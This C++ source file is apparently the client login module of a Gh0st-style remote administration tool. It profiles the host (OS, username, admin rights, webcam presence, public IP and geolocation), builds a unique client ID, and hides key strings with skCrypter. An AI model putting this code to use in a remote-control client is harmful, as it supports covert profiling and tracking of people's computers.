#include "StdAfx.h"
#include "LoginServer.h"
#include "Common.h"
#include <string>
#include <iostream>
#include <iomanip>
#include <ctime>
#include <NTSecAPI.h>
#include "common/skCrypter.h"
#include <common/iniFile.h>
#include <location.h>

// by ChatGPT
bool IsWindows11()
{
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    RTL_OSVERSIONINFOW rovi = { 0 };
    rovi.dwOSVersionInfoSize = sizeof(rovi);

    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        RtlGetVersionPtr rtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (rtlGetVersion) {
            rtlGetVersion(&rovi);
            return (rovi.dwMajorVersion == 10 && rovi.dwMinorVersion == 0 && rovi.dwBuildNumber >= 22000);
        }
    }
    return false;
}

/************************************************************************
---------------------
作者：IT1995
来源：CSDN
原文：https://blog.csdn.net/qq78442761/article/details/64440535
版权声明：本文为博主原创文章，转载请附上博文链接！
修改说明：2019.3.29由袁沅祥修改
************************************************************************/
std::string getSystemName()
{
    std::string vname("未知操作系统");
    //先判断是否为win8.1或win10
    typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
    HINSTANCE hinst = LoadLibrary("ntdll.dll");
    if (hinst == NULL) {
        return vname;
    }
    if (IsWindows11()) {
        vname = "Windows 11";
        Mprintf("此电脑的版本为:%s\n", vname.c_str());
        return vname;
    }
    DWORD dwMajor, dwMinor, dwBuildNumber;
    NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
    if (proc==NULL) {
        return vname;
    }
    proc(&dwMajor, &dwMinor, &dwBuildNumber);
    if (dwMajor == 6 && dwMinor == 3) {	//win 8.1
        vname = "Windows 8.1";
        Mprintf("此电脑的版本为:%s\n", vname.c_str());
        return vname;
    }
    if (dwMajor == 10 && dwMinor == 0) {	//win 10
        vname = "Windows 10";
        Mprintf("此电脑的版本为:%s\n", vname.c_str());
        return vname;
    }
    //下面不能判断Win Server，因为本人还未有这种系统的机子，暂时不给出

    //判断win8.1以下的版本
    SYSTEM_INFO info;                //用SYSTEM_INFO结构判断64位AMD处理器
    GetSystemInfo(&info);            //调用GetSystemInfo函数填充结构
    OSVERSIONINFOEX os;
    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    if (GetVersionEx((OSVERSIONINFO *)&os)) {
        //下面根据版本信息判断操作系统名称
        switch (os.dwMajorVersion) {
        //判断主版本号
        case 4:
            switch (os.dwMinorVersion) {
            //判断次版本号
            case 0:
                if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
                    vname ="Windows NT 4.0";  //1996年7月发布
                else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
                    vname = "Windows 95";
                break;
            case 10:
                vname ="Windows 98";
                break;
            case 90:
                vname = "Windows Me";
                break;
            }
            break;
        case 5:
            switch (os.dwMinorVersion) {
            //再比较dwMinorVersion的值
            case 0:
                vname = "Windows 2000";    //1999年12月发布
                break;
            case 1:
                vname = "Windows XP";      //2001年8月发布
                break;
            case 2:
                if (os.wProductType == VER_NT_WORKSTATION &&
                    info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
                    vname = "Windows XP Professional x64 Edition";
                else if (GetSystemMetrics(SM_SERVERR2) == 0)
                    vname = "Windows Server 2003";   //2003年3月发布
                else if (GetSystemMetrics(SM_SERVERR2) != 0)
                    vname = "Windows Server 2003 R2";
                break;
            }
            break;
        case 6:
            switch (os.dwMinorVersion) {
            case 0:
                if (os.wProductType == VER_NT_WORKSTATION)
                    vname = "Windows Vista";
                else
                    vname = "Windows Server 2008";   //服务器版本
                break;
            case 1:
                if (os.wProductType == VER_NT_WORKSTATION)
                    vname = "Windows 7";
                else
                    vname = "Windows Server 2008 R2";
                break;
            case 2:
                if (os.wProductType == VER_NT_WORKSTATION)
                    vname = "Windows 8";
                else
                    vname = "Windows Server 2012";
                break;
            }
            break;
        default:
            vname = "未知操作系统";
        }
        Mprintf("此电脑的版本为:%s\n", vname.c_str());
    } else
        Mprintf("版本获取失败\n");
    return vname;
}

std::string formatTime(const FILETIME& fileTime)
{
    // 转换为 64 位时间
    ULARGE_INTEGER ull;
    ull.LowPart = fileTime.dwLowDateTime;
    ull.HighPart = fileTime.dwHighDateTime;

    // 转换为秒级时间戳
    std::time_t startTime = static_cast<std::time_t>((ull.QuadPart / 10000000ULL) - 11644473600ULL);

    // 格式化输出
    std::tm* localTime = std::localtime(&startTime);
    char buffer[100];
    std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", localTime);
    return std::string(buffer);
}

std::string getProcessTime()
{
    FILETIME creationTime, exitTime, kernelTime, userTime;

    // 获取当前进程的时间信息
    if (GetProcessTimes(GetCurrentProcess(), &creationTime, &exitTime, &kernelTime, &userTime)) {
        return formatTime(creationTime);
    }
    std::time_t now = std::time(nullptr);
    std::tm* t = std::localtime(&now);
    char buffer[100];
    std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", t);
    return buffer;
}

int getOSBits()
{
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);

    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        return 64;
    } else {
        return 32;
    }
}

// 检查CPU核心数
// SYSTEM_INFO.dwNumberOfProcessors
int GetCPUCores()
{
    INT i = 0;
#ifdef _WIN64
    // 在 x64 下，我们需要使用 `NtQuerySystemInformation`
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    i = sysInfo.dwNumberOfProcessors; // 获取 CPU 核心数
#else
    _asm { // x64编译模式下不支持__asm的汇编嵌入
        mov eax, dword ptr fs : [0x18] ; // TEB
        mov eax, dword ptr ds : [eax + 0x30] ; // PEB
        mov eax, dword ptr ds : [eax + 0x64] ;
        mov i, eax;
    }
#endif
    Mprintf("此计算机CPU核心: %d\n", i);
    return i;
}

double GetMemorySizeGB()
{
    _MEMORYSTATUSEX mst;
    mst.dwLength = sizeof(mst);
    GlobalMemoryStatusEx(&mst);
    double GB = mst.ullTotalPhys / (1024.0 * 1024 * 1024);
    Mprintf("此计算机内存: %fGB\n", GB);
    return GB;
}

#pragma comment(lib, "Version.lib")
std::string GetCurrentExeVersion()
{
    TCHAR filePath[MAX_PATH];
    if (GetModuleFileName(NULL, filePath, MAX_PATH) == 0) {
        return "Unknown";
    }

    DWORD handle = 0;
    DWORD verSize = GetFileVersionInfoSize(filePath, &handle);
    if (verSize == 0) {
        return "Unknown";
    }

    std::vector<BYTE> verData(verSize);
    if (!GetFileVersionInfo(filePath, handle, verSize, verData.data())) {
        return "Unknown";
    }

    VS_FIXEDFILEINFO* pFileInfo = nullptr;
    UINT len = 0;
    if (!VerQueryValue(verData.data(), "\\", reinterpret_cast<LPVOID*>(&pFileInfo), &len)) {
        return "Unknown";
    }

    if (pFileInfo) {
        DWORD major = HIWORD(pFileInfo->dwFileVersionMS);
        DWORD minor = LOWORD(pFileInfo->dwFileVersionMS);
        DWORD build = HIWORD(pFileInfo->dwFileVersionLS);
        DWORD revision = LOWORD(pFileInfo->dwFileVersionLS);

        std::ostringstream oss;
        oss << major << "." << minor << "." << build << "." << revision;
        return "v" + oss.str();
    }

    return "Unknown";
}


std::string GetCurrentUserNameA()
{
    char username[256];
    DWORD size = sizeof(username);

    if (GetUserNameA(username, &size)) {
        return std::string(username);
    } else {
        return "Unknown";
    }
}

#define XXH_INLINE_ALL
#include "server/2015Remote/xxhash.h"
// 基于客户端信息计算唯一ID: { IP, PC, OS, CPU, PATH }
uint64_t CalcalateID(const std::vector<std::string>& clientInfo)
{
    std::string s;
    for (int i = 0; i < 5; i++) {
        s += clientInfo[i] + "|";
    }
    s.erase(s.length()-1);
    return XXH64(s.c_str(), s.length(), 0);
}

LOGIN_INFOR GetLoginInfo(DWORD dwSpeed, CONNECT_ADDRESS& conn, BOOL& isAuthKernel)
{
    isAuthKernel = FALSE;
    iniFile cfg(CLIENT_PATH);
    LOGIN_INFOR  LoginInfor;
    LoginInfor.bToken = TOKEN_LOGIN; // 令牌为登录
    //获得操作系统信息
    strcpy_s(LoginInfor.OsVerInfoEx, getSystemName().c_str());

    //获得PCName
    char szPCName[MAX_PATH] = {0};
    gethostname(szPCName, MAX_PATH);

    DWORD	dwCPUMHz;
    dwCPUMHz = CPUClockMHz();

    BOOL bWebCamIsExist = WebCamIsExist();
    std::string group = cfg.GetStr("settings", "group_name");
    if (!group.empty())
        strcpy_s(conn.szGroupName, group.c_str());
    if (conn.szGroupName[0] == 0)
        memcpy(LoginInfor.szPCName, szPCName, sizeof(LoginInfor.szPCName));
    else
        sprintf(LoginInfor.szPCName, "%s/%s", szPCName, conn.szGroupName);
    LoginInfor.dwSpeed  = dwSpeed;
    LoginInfor.dwCPUMHz = dwCPUMHz;
    LoginInfor.bWebCamIsExist = bWebCamIsExist;
    strcpy_s(LoginInfor.szStartTime, getProcessTime().c_str());
    LoginInfor.AddReserved(GetClientType(conn.ClientType())); // 类型
    LoginInfor.AddReserved(getOSBits());                // 系统位数
    LoginInfor.AddReserved(GetCPUCores());              // CPU核数
    LoginInfor.AddReserved(GetMemorySizeGB());          // 系统内存
    char buf[_MAX_PATH] = {};
    GetModuleFileNameA(NULL, buf, sizeof(buf));
    LoginInfor.AddReserved(buf);                        // 文件路径
    LoginInfor.AddReserved("?");						// test
    std::string installTime = cfg.GetStr("settings", "install_time");
    if (installTime.empty()) {
        installTime = ToPekingTimeAsString(nullptr);
        cfg.SetStr("settings", "install_time", installTime);
    }
    LoginInfor.AddReserved(installTime.c_str());		// 安装时间
    LoginInfor.AddReserved("?");						// 安装信息
    LoginInfor.AddReserved(sizeof(void*)==4 ? 32 : 64); // 程序位数
    std::string str;
    std::string masterHash(skCrypt(MASTER_HASH));
    std::string pid = std::to_string(GetCurrentProcessId());
    HANDLE hEvent1 = OpenEventA(SYNCHRONIZE, FALSE, std::string("YAMA_" + pid).c_str());
    HANDLE hEvent2 = OpenEventA(SYNCHRONIZE, FALSE, std::string("EVENT_" + pid).c_str());
    if (hEvent1 != NULL || hEvent2 != NULL)
    {
        Mprintf("Check event handle: %d, %d\n", hEvent1 != NULL, hEvent2 != NULL);
		isAuthKernel = TRUE;
        CloseHandle(hEvent1);
		CloseHandle(hEvent2);
        config*cfg = conn.pwdHash == masterHash ? new config : new iniFile;
        str = cfg->GetStr("settings", "Password", "");
        delete cfg;
        str.erase(std::remove(str.begin(), str.end(), ' '), str.end());
        auto list = StringToVector(str, '-', 3);
        str = list[1].empty() ? "Unknown" : list[1];
    }
    LoginInfor.AddReserved(str.c_str());			   // 授权信息
    bool isDefault = strlen(conn.szFlag) == 0 || strcmp(conn.szFlag, skCrypt(FLAG_GHOST)) == 0 ||
                     strcmp(conn.szFlag, skCrypt("Happy New Year!")) == 0;
    const char* id = isDefault ? masterHash.c_str() : conn.szFlag;
    memcpy(LoginInfor.szMasterID, id, min(strlen(id), 16));
    std::string loc = cfg.GetStr("settings", "location", "");
    std::string pubIP = cfg.GetStr("settings", "public_ip", "");
    auto ip_time = cfg.GetInt("settings", "ip_time");
    bool timeout = ip_time <= 0 || (time(0) - ip_time > 7 * 86400);
    IPConverter cvt;
    if (loc.empty() || pubIP.empty() || timeout) {
        pubIP = cvt.getPublicIP();
        loc = cvt.GetGeoLocation(pubIP);
        cfg.SetStr("settings", "location", loc);
        cfg.SetStr("settings", "public_ip", pubIP);
        cfg.SetInt("settings", "ip_time", time(0));
    }
    LoginInfor.AddReserved(loc.c_str());
    LoginInfor.AddReserved(pubIP.c_str());
    LoginInfor.AddReserved(GetCurrentExeVersion().c_str());
    BOOL IsRunningAsAdmin();
    LoginInfor.AddReserved(GetCurrentUserNameA().c_str());
    LoginInfor.AddReserved(IsRunningAsAdmin());
    char cpuInfo[32];
    sprintf(cpuInfo, "%dMHz", dwCPUMHz);
    conn.clientID = CalcalateID({ pubIP, szPCName, LoginInfor.OsVerInfoEx, cpuInfo, buf });
    Mprintf("此客户端的唯一标识为: %s\n", std::to_string(conn.clientID).c_str());
    return LoginInfor;
}


DWORD CPUClockMHz()
{
    HKEY	hKey;
    DWORD	dwCPUMHz;
    DWORD	dwReturn = sizeof(DWORD);
    DWORD	dwType = REG_DWORD;
    RegOpenKey(HKEY_LOCAL_MACHINE,
               "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
    RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMHz, &dwReturn);
    RegCloseKey(hKey);
    return	dwCPUMHz;
}

BOOL WebCamIsExist()
{
    BOOL	bOk = FALSE;

    char	szDeviceName[100], szVer[50];
    for (int i = 0; i < 10 && !bOk; ++i) {
        bOk = capGetDriverDescription(i, szDeviceName, sizeof(szDeviceName),
                                      //系统的API函数
                                      szVer, sizeof(szVer));
    }
    return bOk;
}
